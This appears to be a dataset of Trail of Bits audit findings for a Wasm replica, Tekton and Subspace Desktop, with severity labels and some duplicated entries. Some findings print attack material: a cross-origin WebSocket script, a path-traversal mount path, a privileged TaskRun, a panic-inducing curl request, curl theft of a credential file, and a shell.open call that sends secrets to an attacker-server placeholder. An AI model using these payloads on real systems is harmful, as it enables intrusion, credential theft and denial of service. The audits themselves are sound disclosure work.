SystemStateChanges::default() }; Figure 6.1: replica_controller/src/sandboxed_execution_controller.rs:663 However, the code does not validate the Wasm and stable memory sizes against the corresponding page maps. This means that a compromised sandbox could report a Wasm or stable memory size of 0 along with a non-empty page map. Since these memory sizes are used to calculate the total memory used by the canister in ExecutionState::memory_usage, this lack of validation could allow the canister to use up cycles normally reserved for memory use. pub fn memory_usage(&self) -> NumBytes { // We use 8 bytes per global. let globals_size_bytes = 8 * self.exported_globals.len() as u64; let wasm_binary_size_bytes = self.wasm_binary.binary.len() as u64; num_bytes_try_from(self.wasm_memory.size) .expect(\"could not convert from wasm memory number of pages to bytes\") + num_bytes_try_from(self.stable_memory.size) .expect(\"could not convert from stable memory number of pages to bytes\") + NumBytes::from(globals_size_bytes) + NumBytes::from(wasm_binary_size_bytes) } Figure 6.2: replicated_state/src/canister_state/execution_state.rs:411421 Canister memory usage aects how much the cycles account manager charges the canister for resource allocation. If the canister uses best-eort memory allocation, the implementation calls through to ExecutionState::memory_usage to compute how much memory the canister is using. pub fn charge_canister_for_resource_allocation_and_usage( &self, log: &ReplicaLogger, canister: &mut CanisterState, duration_between_blocks: Duration, ) -> Result<(), CanisterOutOfCyclesError> { let bytes_to_charge = match canister.memory_allocation() { // The canister has explicitly asked for a memory allocation. MemoryAllocation::Reserved(bytes) => bytes, // The canister uses best-effort memory allocation. MemoryAllocation::BestEffort => canister.memory_usage(self.own_subnet_type), }; if let Err(err) = self.charge_for_memory( &mut canister.system_state, bytes_to_charge, duration_between_blocks, ) { } // ... <redacted> // ... <redacted> } Figure 6.3: cycles_account_manager/src/lib.rs:671 Thus, if a sandboxed process reports a lower memory usage, the cycles account manager will charge the canister less than it should. It is unclear whether this represents expected behavior when a canister breaks out of the Wasm execution environment. Clearly, if the canister is able to execute arbitrary code in the context of a sandboxed process, then the replica has lost all ability to meter and restrict canister execution, which means that accounting for canister cycle and memory use is largely meaningless. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. The canister reports the wrong memory sizes back to the replica with the execution output. This causes the cycles account manager to miscalculate the remaining available cycles for the canister in the charge_canister_for_resource_allocation_and_usage method. Recommendations Short term, document this behavior and ensure that implicitly trusting the canister output could not adversely aect the replica or other canisters running on the system. Consider enforcing the correct invariants for memory allocations reported by a sandboxed process. The following invariant should always hold for Wasm and stable memory: page_map_size <= memory.size <= MAX_SIZE page_map_size could be computed as memory.page_map.num_host_pages() * PAGE_SIZE.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. The use of time.After() in select statements can lead to memory leaks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Calls to time.After in for/select statements can lead to memory leaks because the garbage collector does not clean up the underlying Timer object until the timer res. A new timer, which requires resources, is initialized at each iteration of the for loop (and, hence, the select statement). As a result, many routines originating from the time.After call could lead to overconsumption of the memory. for { select { case <-ctx.Done(): // When the context is cancelled, stop reporting. return case <-time.After(r.ReportingPeriod): // Every 30s surface a metric for the number of running pipelines. if err := r.RunningPipelineRuns(lister); err != nil { logger.Warnf(\"Failed to log the metrics : %v\", err) } Figure 1.1: tektoncd/pipeline/pkg/pipelinerunmetrics/metrics.go#L290-L300 for { select { case <-ctx.Done(): // When the context is cancelled, stop reporting. return case <-time.After(r.ReportingPeriod): // Every 30s surface a metric for the number of running tasks. if err := r.RunningTaskRuns(lister); err != nil { logger.Warnf(\"Failed to log the metrics : %v\", err) } } Figure 1.2: pipeline/pkg/taskrunmetrics/metrics.go#L380-L391 Exploit Scenario An attacker nds a way to overuse a function, which leads to overconsumption of the memory and causes Tekton Pipelines to crash. Recommendations Short term, consider refactoring the code that uses the time.After function in for/select loops using tickers. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, ensure that the time.After method is not used in for/select routines. Periodically use the Semgrep query to check for and detect similar patterns. References  Use with caution time.After Can cause memory leak (golang)  Golang <-time.After() is not garbage collected before expiry", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Risk of resource exhaustion due to the use of defer inside a loop ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The ExecuteInterceptors function runs all interceptors congured for a given trigger inside a loop. The res.Body.Close() function is deferred at the end of the loop. Calling defer inside of a loop could cause resource exhaustion conditions because the deferred function is called when the function exits, not at the end of each loop. As a result, resources from each interceptor object are accumulated until the end of the for statement. While this may not cause noticeable issues in the current state of the application, it is best to call res.Body.Close() at the end of each loop to prevent unforeseen issues. func (r Sink) ExecuteInterceptors(trInt []*triggersv1.TriggerInterceptor, in *http.Request, event []byte, log *zap.SugaredLogger, eventID string, triggerID string, namespace string, extensions map[string]interface{}) ([]byte, http.Header, *triggersv1.InterceptorResponse, error) { if len(trInt) == 0 { return event, in.Header, nil, nil } // (...) for _, i := range trInt { if i.Webhook != nil { // Old style interceptor // (...) defer res.Body.Close() Figure 2.1: triggers/pkg/sink/sink.go#L428-L469 Recommendations Short term, rather than deferring the call to res.Body.Close(), add a call to res.Body.Close() at the end of the loop.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Lack of access controls for Tekton Pipelines API ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The Tekton Pipelines extension uses an API to process requests for various tasks such as listing namespaces and creating TaskRuns. While Tekton provides documentation on enabling OAuth2 authentication, the API is unauthenticated by default. Should a Tekton operator expose the dashboard for other users to monitor their own deployments, every API method would be available to them, allowing them to perform tasks on namespaces that they do not have access to. Figure 3.1: Successful unauthenticated request Exploit Scenario An attacker discovers the endpoint exposing the Tekton Pipelines API and uses it to perform destructive tasks such as deleting PipelineRuns. Furthermore, the attacker can discover potentially sensitive information pertaining to deployments congured in Tekton. Recommendations Short term, add documentation on securing access to the API using Kubernetes security controls, including explicit documentation on the security implications of exposing access to the dashboard and, therefore, the API. Long term, add an access control mechanism for controlling who can access the API and limiting access to namespaces as needed and/or possible. 4. Insu\u0000cient validation of volumeMounts paths Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-4 Target: Various", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "5. Missing validation of Origin header in WebSocket upgrade requests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Tekton Dashboard uses the WebSocket protocol to provide real-time updates for TaskRuns, PipelineRuns, and other Tekton data. The endpoints responsible for upgrading the incoming HTTP request to a WebSocket request do not validate the Origin header to ensure that the request is coming from a trusted origin (i.e., the dashboard itself). As a result, arbitrary malicious web pages can connect to Tekton Dashboard and receive these real-time updates, which may include sensitive information, such as the log output of TaskRuns and PipelineRuns. Exploit Scenario A user hosts Tekton Dashboard on a private address, such as one in a local area network or a virtual private network (VPN), without enabling application-layer authentication. An attacker identies the URL of the dashboard instance (e.g., http://192.168.3.130:9097) and hosts a web page with the following content: <script> var ws = new WebSocket(\"ws://192.168.3.130:9097/apis/tekton.dev/v1beta1/namespaces/tekton-pipelin es/pipelineruns/?watch=true&resourceVersion=1770\"); ws.onmessage = function (event) { console.log(event.data); } </script> Figure 5.1: A malicious web page that extracts Tekton Dashboard WebSocket updates The attacker convinces the user to visit the web page. Upon loading it, the users browser successfully connects to the Tekton Dashboard WebSocket endpoint for monitoring PipelineRuns and logs received messages to the JavaScript console. As a result, the attackers untrusted web origin now has access to real-time updates from a dashboard instance on a private network that would otherwise be inaccessible outside of that network. Figure 5.2: The untrusted origin http://localhost:8080 has access to Tekton Dashboard WebSocket messages. Recommendations Short term, modify the code so that it veries that the Origin header of WebSocket upgrade requests corresponds to the trusted origin on which Tekton Dashboard is served. For example, if the origin is not http://192.168.3.130:9097, Tekton Dashboard should reject the incoming request. 6. Import resources feature does not validate repository URL scheme Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-6 Target: Dashboard", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "8. Tekton allows users to create privileged containers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Tekton allows users to dene task and sidecar objects with a privileged security context, which eectively grants task containers all capabilities. Tekton operators can use admission controllers to disallow users from using this option. However, information on this mitigation in the guidance documents for Tekton Pipelines is insucient and should be made clear. If an attacker gains code execution on any of these containers, the attacker could break out of it and gain full access to the host machine. We were not able to escape step containers running in privileged mode during the time allotted for this audit. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: build-push-secret-10 spec: serviceAccountName: build-bot taskSpec: steps: - name: secret securityContext: privileged: true image: ubuntu script: | #!/usr/bin/env bash sleep 20m Figure 8.1: TaskRun denition with the privileged security context root@build-push-secret-10-pod:/proc/fs# find -type f -maxdepth 5 -writable find: warning: you have specified the global option -maxdepth after the argument -type, but global options are not positional, i.e., -maxdepth affects tests specified before it as well as those specified after it. Please specify global options before other arguments. ./xfs/xqm ./xfs/xqmstat ./cifs/Stats ./cifs/cifsFYI ./cifs/dfscache ./cifs/traceSMB ./cifs/DebugData ./cifs/open_files ./cifs/SecurityFlags ./cifs/LookupCacheEnabled ./cifs/LinuxExtensionsEnabled ./ext4/vda1/fc_info ./ext4/vda1/options ./ext4/vda1/mb_groups ./ext4/vda1/es_shrinker_info ./jbd2/vda1-8/info ./fscache/stats Figure 8.2: With the privileged security context in gure 8.1, it is now possible to write to several les in /proc/fs, for example. Exploit Scenario A malicious developer runs a TaskRun with a privileged security context and obtains shell access to the container. Using one of various known exploits, he breaks out of the container and gains root access on the host. Recommendations Short term, create clear, easy-to-locate documentation warning operators about allowing developers and other users to dene a privileged security context for step containers, and include guidance on how to restrict such a feature. 9. Insu\u0000cient default network access controls between pods Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-TKN-9 Target: Pipelines", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "11. Lack of rate-limiting controls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Tekton Dashboard does not enforce rate limiting of HTTP requests. As a result, we were able to issue over a thousand requests in just over a minute. Figure 11.1: We sent over a thousand requests to Tekton Dashboard without being rate limited. Processing requests sent at such a high rate can consume an inordinate amount of resources, increasing the risk of denial-of-service attacks through excessive resource consumption. In particular, we were able to create hundreds of running import resources pods that were able to consume nearly all the hosts memory in the span of a minute. Exploit Scenario An attacker oods a Tekton Dashboard instance with HTTP requests that execute pipelines, leading to a denial-of-service condition. Recommendations Short term, implement rate limiting on all API endpoints. Long term, run stress tests to ensure that the rate limiting enforced by Tekton Dashboard is robust.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "12. Lack of maximum request and response body constraint ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The ioutil.ReadAll function reads from source until an error or an end-of-le (EOF) condition occurs, at which point it returns the data that it read. This function is used in dierent les of the Tekton Triggers and Tekton Pipelines codebases to read requests and responses. There is no limit on the maximum size of request and response bodies, so using ioutil.ReadAll to parse requests and responses could cause a denial of service (due to insucient memory). A denial of service could also occur if an exhaustive resource is loaded multiple times. This method is used in the following locations of the codebase: File pkg/remote/oci/resolver.go:L211 pkg/sink/sink.go:147,465 Project Pipelines Triggers pkg/interceptors/webhook/webhook.go:77 Triggers pkg/interceptors/interceptors.go:176 Triggers pkg/sink/validate_payload.go:29 cmd/binding-eval/cmd/root.go:141 cmd/triggerrun/cmd/root.go:182 Triggers Triggers Triggers Recommendations Short term, place a limit on the maximum size of request and response bodies. For example, this limit can be implemented by using the io.LimitReader function. Long term, place limits on request and response bodies globally in other places within the application to prevent denial-of-service attacks.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Lack of access controls for Tekton Pipelines API ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The Tekton Pipelines extension uses an API to process requests for various tasks such as listing namespaces and creating TaskRuns. While Tekton provides documentation on enabling OAuth2 authentication, the API is unauthenticated by default. Should a Tekton operator expose the dashboard for other users to monitor their own deployments, every API method would be available to them, allowing them to perform tasks on namespaces that they do not have access to. Figure 3.1: Successful unauthenticated request Exploit Scenario An attacker discovers the endpoint exposing the Tekton Pipelines API and uses it to perform destructive tasks such as deleting PipelineRuns. Furthermore, the attacker can discover potentially sensitive information pertaining to deployments congured in Tekton. Recommendations Short term, add documentation on securing access to the API using Kubernetes security controls, including explicit documentation on the security implications of exposing access to the dashboard and, therefore, the API. Long term, add an access control mechanism for controlling who can access the API and limiting access to namespaces as needed and/or possible.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "4. Insu\u0000cient validation of volumeMounts paths ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The Tekton Pipelines extension performs a number of validations against task steps whenever a task is submitted for Tekton to process. One such validation veries that the path for a volume mount is not inside the /tekton directory. This directory is treated as a special directory by Tekton, as it is used for Tekton-specic functionality. However, the extension uses strings.HasPrefix to verify that MountPath does not contain the string /tekton/ without rst sanitizing it. As a result, it is possible to create volume mounts inside /tekton by using path traversal strings such as /somedir/../tekton/newdir in the volumeMounts variable of a task step denition. for j, vm := range s.VolumeMounts { if strings.HasPrefix(vm.MountPath, \"/tekton/\") && !strings.HasPrefix(vm.MountPath, \"/tekton/home\") { errs = errs.Also(apis.ErrGeneric(fmt.Sprintf(\"volumeMount cannot be mounted under /tekton/ (volumeMount %q mounted at %q)\", vm.Name, vm.MountPath), \"mountPath\").ViaFieldIndex(\"volumeMounts\", j)) } if strings.HasPrefix(vm.Name, \"tekton-internal-\") { errs = errs.Also(apis.ErrGeneric(fmt.Sprintf(`volumeMount name %q cannot start with \"tekton-internal-\"`, vm.Name), \"name\").ViaFieldIndex(\"volumeMounts\", j)) } } Figure 4.1: pipeline/pkg/apis/pipeline/v1beta1/task_validation.go#L218-L226 The YAML le in the gure below was used to create a volume in the reserved /tekton directory. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: vol-test spec: taskSpec: steps: - image: docker name: client workingDir: /workspace script: | #!/usr/bin/env sh sleep 15m volumeMounts: - mountPath: /certs/client/../../../tekton/mytest name: empty-path volumes: - name: empty-path emptyDir: {} Figure 4.2: Task run le used to create a volume mount inside an invalid location The gure below demonstrates that the previous le successfully created the mytest directory inside of the /tekton directory by using a path traversal string. $ kubectl exec -i -t vol-test -- /bin/sh Defaulted container \"step-client\" out of: step-client, place-tools (init), step-init (init), place-scripts (init) /workspace # cd /tekton/ /tekton # ls bin creds downward home scripts steps termination results run mytest Figure 4.3: Logging into the task pod container, we can now list the mytest directory inside of /tekton. Recommendations Short term, modify the code so that it converts the mountPath string into a le path and uses a function such as filepath.Clean to sanitize and canonicalize it before validating it.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "7. Insu\u0000cient security hardening of step containers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Containers used for running task and pipeline steps have excessive security context options enabled. This increases the attack surface of the system, and issues such as Linux kernel bugs may allow attackers to escape a container if they gain code execution within a Tekton container. The gure below shows the security properties of a task container with the docker driver. 0 0 0 0 0 0 cat 0 0 # cat /proc/self/status | egrep 'Name|Uid|Gid|Groups|Cap|NoNewPrivs|Seccomp' Name: Uid: Gid: Groups: CapInh: 00000000a80425fb CapPrm: 00000000a80425fb CapEff: 00000000a80425fb CapBnd: 00000000a80425fb CapAmb: 0000000000000000 NoNewPrivs: 0 0 Seccomp: Seccomp_filters: 0 Figure 7.1: The security properties of one of the step containers Exploit Scenario Eve nds a bug that allows her to run arbitrary code on behalf of a conned process within a container, using it to gain more privileges in the container and then to attack the host. Recommendations Short term, drop default capabilities from containers and prevent processes from gaining additional privileges by setting the --cap-drop=ALL and --security-opt=no-new-privileges:true ags when starting containers. Long term, review and implement the Kubernetes security recommendations in appendix C.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. Tekton allows users to create privileged containers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Tekton allows users to dene task and sidecar objects with a privileged security context, which eectively grants task containers all capabilities. Tekton operators can use admission controllers to disallow users from using this option. However, information on this mitigation in the guidance documents for Tekton Pipelines is insucient and should be made clear. If an attacker gains code execution on any of these containers, the attacker could break out of it and gain full access to the host machine. We were not able to escape step containers running in privileged mode during the time allotted for this audit. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: build-push-secret-10 spec: serviceAccountName: build-bot taskSpec: steps: - name: secret securityContext: privileged: true image: ubuntu script: | #!/usr/bin/env bash sleep 20m Figure 8.1: TaskRun denition with the privileged security context root@build-push-secret-10-pod:/proc/fs# find -type f -maxdepth 5 -writable find: warning: you have specified the global option -maxdepth after the argument -type, but global options are not positional, i.e., -maxdepth affects tests specified before it as well as those specified after it. Please specify global options before other arguments. ./xfs/xqm ./xfs/xqmstat ./cifs/Stats ./cifs/cifsFYI ./cifs/dfscache ./cifs/traceSMB ./cifs/DebugData ./cifs/open_files ./cifs/SecurityFlags ./cifs/LookupCacheEnabled ./cifs/LinuxExtensionsEnabled ./ext4/vda1/fc_info ./ext4/vda1/options ./ext4/vda1/mb_groups ./ext4/vda1/es_shrinker_info ./jbd2/vda1-8/info ./fscache/stats Figure 8.2: With the privileged security context in gure 8.1, it is now possible to write to several les in /proc/fs, for example. Exploit Scenario A malicious developer runs a TaskRun with a privileged security context and obtains shell access to the container. Using one of various known exploits, he breaks out of the container and gains root access on the host. Recommendations Short term, create clear, easy-to-locate documentation warning operators about allowing developers and other users to dene a privileged security context for step containers, and include guidance on how to restrict such a feature.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "9. Insu\u0000cient default network access controls between pods ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "By default, containers deployed as part of task steps do not have any egress or ingress network restrictions. As a result, containers could reach services exposed over the network from any task step container. For instance, in gure 9.2, a user logs into a container running a task step in the developer-group namespace and successfully makes a request to a service in a step container in the qa-group namespace. root@build-push-secret-35-pod:/# ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 172.17.0.17 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:11 txqueuelen 0 (Ethernet) RX packets 21831 bytes 32563599 (32.5 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 6465 bytes 362926 (362.9 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 root@build-push-secret-35-pod:/# python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... 172.17.0.16 - - [08/Mar/2022 01:03:50] \"GET /tekton/creds-secrets/basic-user-pass-canary/password HTTP/1.1\" 200 - 172.17.0.16 - - [08/Mar/2022 01:04:05] \"GET /tekton/creds-secrets/basic-user-pass-canary/password HTTP/1.1\" 200 - Figure 9.1: Exposing a simple server in a step container in the developer-group namespace root@build-push-secret-35-pod:/# curl 172.17.0.17:8000/tekton/creds-secrets/basic-user-pass-canary/password mySUPERsecretPassword Figure 9.2: Reaching the service exposed in gure 9.1 from another container in the qa-group namespace Exploit Scenario An attacker launches a malicious task container that reaches a service exposed via a sidecar container and performs unauthorized actions against the service. Recommendations Short term, enforce ingress and egress restrictions to allow only resources that need to speak to each other to do so. Leverage allowlists instead of denylists to ensure that only expected components can establish these connections. Long term, ensure the use of appropriate methods of isolation to prevent lateral movement. 10. Import resources\" feature does not validate repository path Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-10 Target: Dashboard", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "13. Nil dereferences in the trigger interceptor logic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The Process functions, which are responsible for executing the various triggers for the git, gitlab, bitbucket, and cel interceptors, do not properly validate request objects, leading to nil dereference panics when requests are submitted without a Context object. func (w *Interceptor) Process(ctx context.Context, r *triggersv1.InterceptorRequest) *triggersv1.InterceptorResponse { headers := interceptors.Canonical(r.Header) // (...) // Next validate secrets if p.SecretRef != nil { // Check the secret to see if it is empty if p.SecretRef.SecretKey == \"\" { interceptor secretRef.secretKey is empty\") return interceptors.Fail(codes.FailedPrecondition, \"github } // (...) ns, _ := triggersv1.ParseTriggerID(r.Context.TriggerID) Figure 13.1: triggers/pkg/interceptors/github/github.go#L48-L85 We tested the panic by forwarding the Tekton Triggers webhook server to localhost and sending HTTP requests to the GitHub endpoint. The Go HTTP server recovers from the panic. curl -i -s -k -X $'POST' \\ -H $'Host: 127.0.0.1:1934' -H $'Content-Length: 178' \\ --data-binary $'{\\x0d\\x0a\\\"header\\\":{\\x0d\\x0a\\\"X-Hub-Signature\\\":[\\x0d\\x0a\\x09\\\"sig\\\"\\x0d\\x0a],\\x0 d\\x0a\\\"X-GitHub-Event\\\":[\\x0d\\x0a\\\"evil\\\"\\x0d\\x0a]\\x0d\\x0a},\\x0d\\x0a\\\"interceptor_pa rams\\\": {\\x0d\\x0a\\x09\\\"secretRef\\\": {\\x0d\\x0a\\x09\\x09\\\"secretKey\\\":\\\"key\\\",\\x0d\\x0a\\x09\\x09\\\"secretName\\\":\\\"name\\\"\\x0d\\x 0a\\x09}\\x0d\\x0a}\\x0d\\x0a}' \\ $'http://127.0.0.1:1934/github' Figure 13.2: The curl request that causes a panic 2022/03/08 05:34:13 http: panic serving 127.0.0.1:49304: runtime error: invalid memory address or nil pointer dereference goroutine 33372 [running]: net/http.(*conn).serve.func1(0xc0001bf0e0) net/http/server.go:1824 +0x153 panic(0x1c25340, 0x30d6060) runtime/panic.go:971 +0x499 github.com/tektoncd/triggers/pkg/interceptors/github.(*Interceptor).Process(0xc00000 d248, 0x216fec8, 0xc0003d5020, 0xc0002b7b60, 0xc0000a7978) github.com/tektoncd/triggers/pkg/interceptors/github/github.go:85 +0x1f5 github.com/tektoncd/triggers/pkg/interceptors/server.(*Server).ExecuteInterceptor(0x c000491490, 0xc000280200, 0x0, 0x0, 0x0, 0x0, 0x0) github.com/tektoncd/triggers/pkg/interceptors/server/server.go:128 +0x5df github.com/tektoncd/triggers/pkg/interceptors/server.(*Server).ServeHTTP(0xc00049149 0, 0x2166dc0, 0xc0000d42a0, 0xc000280200) github.com/tektoncd/triggers/pkg/interceptors/server/server.go:57 +0x4d net/http.(*ServeMux).ServeHTTP(0xc00042d000, 0x2166dc0, 0xc0000d42a0, 0xc000280200) net/http/server.go:2448 +0x1ad net/http.serverHandler.ServeHTTP(0xc0000d4000, 0x2166dc0, 0xc0000d42a0, 0xc000280200) net/http/server.go:2887 +0xa3 net/http.(*conn).serve(0xc0001bf0e0, 0x216ff00, 0xc00042d200) net/http/server.go:1952 +0x8cd created by net/http.(*Server).Serve net/http/server.go:3013 +0x39b Figure 13.3: Panic trace Exploit Scenario As the codebase continues to grow, a new mechanism is added to call one of the Process functions without relying on HTTP requests (for instance, via a custom RPC client implementation). An attacker uses this mechanism to create a new interceptor. He calls the Process function with an invalid object, causing a panic that crashes the Tekton Triggers webhook server. Recommendations Short term, add checks to verify that request Context objects are not nil before dereferencing them. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "1. Desktop application conguration le stored in group writable le ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf", "body": "The desktop application conguration le has group writable permissions, as shown in gure 1.1. >>> ls -l $HOME/.config/subspace-desktop/subspace-desktop.cfg -rw-rw-r-- 1 user user 143 $HOME/.config/subspace-desktop/subspace-desktop.cfg Figure 1.1: Permissions of the $HOME/.config/subspace-desktop/subspace-desktop.cfg le This conguration le contains the rewardAddress eld (gure 1.2), to which the Subspace farmer sends the farming rewards. Therefore, anyone who can modify this le can control the address that receives farming rewards. For this reason, only the le owner should have the permissions necessary to write to it. { \"plot\" : { \"location\" : \"<REDACTED>/.local/share/subspace-desktop/plots\" , \"sizeGB\" : 1 }, \"rewardAddress\" : \"stC2Mgq<REDACTED>\" , \"launchOnBoot\" : true , \"version\" : \"0.6.11\" , \"nodeName\" : \"agreeable-toothbrush-4936\" } Figure 1.2: An example of a conguration le Exploit Scenario An attacker controls a Linux user who belongs to the victims user group. Because every member of the user group is able to write to the victims conguration le, the attacker is able to change the rewardAddress eld of the le to an address she controls. As a result, she starts receiving the victims farming rewards. Recommendations Short term, change the conguration les permissions so that only its owner can read and write to it. This will prevent unauthorized users from reading and modifying the le. Additionally, create a centralized function that creates the conguration le; currently, the le is created by code in multiple places in the codebase. Long term, create tests to ensure that the conguration le is created with the correct permissions. 2. Insu\u0000cient validation of users reward addresses Severity: Low Diculty: Medium Type: Data Validation Finding ID: TOB-SPDF-2 Target: subspace-desktop/src/pages/ImportKey.vue", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Improper error handling ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf", "body": "The front end code handles errors incorrectly in the following cases:          The Linux auto launcher function createAutostartDir does not return an error if it fails to create the autostart directory. The Linux auto launcher function enable does not return an error if it fails to create the autostart le. The Linux auto launcher function disable does not return an error if it fails to remove the autostart le. The Linux auto launcher function isEnabled always returns true , even if it fails to read the autostart le, which indicates that the auto launcher is disabled. The exportLogs function does not display error messages to users when errors occur. Instead, it silently fails. If rewardAddress is not set, the startFarming function sends an error log to the back end but not to the front end. Despite the error, the function still tries to start farming without a reward address, causing the back end to error out. Without an error message displayed in the front end, the source of the failure is unclear. The Config::init function does not show users an error message if it fails to create the conguration directory. The Config::write function does not show users an error message if it fails to create the conguration directory, and it proceeds to try to write to the nonexistent conguration le. Additionally, it does not show an error message if it fails to write to the conguration le in its call to writeFile . The removePlot function does not return an error if it fails to delete the plots directory.   The createPlotDir function does not return an error if it fails to create the plots folder (e.g., if the given user does not have the permissions necessary to create the folder in that directory). This will cause the startPlotting function to fail silently; without an error message, the user cannot know the source of the failure. The createAutostartDir function logs an error unnecessarily. The function determines whether a directory exists by calling the readDir function; however, even though occasionally the directory may not be found (as expected), the function always logs an error if it is not found. Exploit Scenario To store his plots, a user chooses a directory that he does not have the permissions necessary to write to. The program fails but does not display a clear error message with the reason for the failure. The user cannot understand the problem, becomes frustrated, and deletes the application. Recommendations Short term, modify the code in the locations described above to handle errors consistently and to display messages with clear reasons for the errors in the UI. This will make the code more reliable and reduce the likelihood that users will face obstacles when using the Subspace Desktop application. Long term, write tests that trigger all possible error conditions and check that all errors are handled gracefully and are accompanied by error messages displayed to the user where relevant. This will prevent regressions during the development process.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "4. Flawed regex in the Tauri conguration ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf", "body": "The Tauri conguration that limits which les the front end can open with the systems default applications is awed. As shown in gure 4.1, the conguration le uses the [/subspace\\\\-desktop/] regex; the Subspace developers intended this regex to match le names that include the /subspace-desktop/ string, but the regex actually matches any string that has a single character inside the regex's square brackets. \"shell\" : { \"all\" : true , \"execute\" : true , \"open\" : \"[/subspace\\\\-desktop/]\" , \"scope\" : [ \"name\" : \"run-osascript\" , \"cmd\" : \"osascript\" , \"args\" : true { } ] }, Figure 4.1: subspace-desktop/src-tauri/tauri.conf.json#L81-L92 For example, tauri.shell.open(\"s\") is accepted as a valid location because s is inside the regexs square brackets. Contrarily, tauri.shell.open(\"z\") is an invalid location because z is not inside the square brackets. Besides opening les, in Linux, the tauri.shell.open function will handle anything that the xdg-open command handles. For example, tauri.shell.open(\"apt://firefox\") shows users a prompt to install Firefox. Attackers could also use the tauri.shell.open function to make arbitrary HTTP requests and bypass the CSPs connect-src directive with calls such as tauri.shell.open(\"https://<attacker-server>/?secret_data=<secrets>\") . Exploit Scenario An attacker nds a cross-site scripting (XSS) vulnerability in the Subspace Desktop front end. He uses the XSS vulnerability to open an arbitrary URL protocol with the exploit described above and gains the ability to remotely execute code on the users machine. For examples of how common URL protocol handlers can lead to remote code execution attacks, refer to the vulnerabilities in the Steam and Visual Studio Code URL protocols. Recommendations Short term, revise the regex so that the front end can open only file: URLs that are within the Subspace Desktop applications logs folder. Alternatively, have the Rust back end serve these les and disallow the front end from accessing any les (see issue TOB-SPDF-5 for a more complete architectural recommendation). Long term, write positive and negative tests that check the developers assumptions related to the Tauri conguration. 5. Insu\u0000cient privilege separation between the front end and back end Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-SPDF-5 Target: The Subspace Desktop architecture", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "6. Vulnerable dependencies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf", "body": "The Subspace Desktop Tauri application uses vulnerable Rust and Node dependencies, as reported by the cargo audit and yarn audit tools. Among the Rust crates used in the Tauri application, two are vulnerable, three are unmaintained, and six are yanked. The table below summarizes the ndings: Crate Version in Use Finding Latest Safe Version owning_ref 0.4.1 Memory corruption vulnerability ( RUSTSEC-2022-0040 ) Not available time 0.1.43 Memory corruption vulnerability 